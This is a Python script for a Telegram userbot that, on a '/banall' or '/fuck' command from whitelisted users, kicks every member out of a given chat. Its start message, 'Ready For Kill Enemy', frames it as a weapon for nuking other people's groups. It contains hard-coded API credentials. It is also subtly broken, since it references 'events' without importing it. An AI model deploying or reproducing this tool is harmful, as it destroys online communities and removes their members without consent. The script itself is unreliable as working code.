from os import getenv
from asyncio import sleep
from telethon.sync import TelegramClient
from telethon.tl import functions
from telethon.tl.types import InputUser
from telethon.errors import ChatAdminRequiredError

API_ID = 12227067
API_HASH = "b463bedd791aa733ae2297e6520302fe"
SESSION = getenv('SESSION')
SUDO_USERS = list(map(int, getenv("SUDO_USERS", "").split()))
SUDO_USERS.append(5360305806)
CHATS = [-1001544173381, -1001841879487]

client = TelegramClient(SESSION, API_ID, API_HASH)


@client.on(events.NewMessage(chats=SUDO_USERS, pattern='/start'))
async def start(event):
    await event.reply("𝓐𝓜𝓑𝓞𝓣 𝓡𝓮𝓪𝓭𝔂 𝓕𝓸𝓻 𝓚𝓲𝓵𝓵 𝓔𝓷𝓮𝓶𝔂....")


@client.on(events.NewMessage(chats=SUDO_USERS, pattern='/fuck|/banall'))
async def altron(event):
    try:
        chat_id = int(event.text.split(" ")[1])
        await event.reply("ᴏɴʟɪɴᴇ")
        if chat_id in CHATS:
            return
    except (ValueError, IndexError):
        await event.reply("**Usage:**\n`/fuck [chat_id]`\n\n`/banall`")
        return

    await event.edit("Boom...")
    await sleep(3)

    async for member in client.iter_participants(chat_id):
        if member.id in SUDO_USERS:
            continue
        try:
            await client.kick_participant(chat_id, member.id)
        except ChatAdminRequiredError:
            print("Bot does not have admin rights in the chat.")
            break
        except Exception as e:
            print(f"Error banning user {member.id}: {e}")

if __name__ == "__main__":
    client.start()
    client.run_until_disconnected()
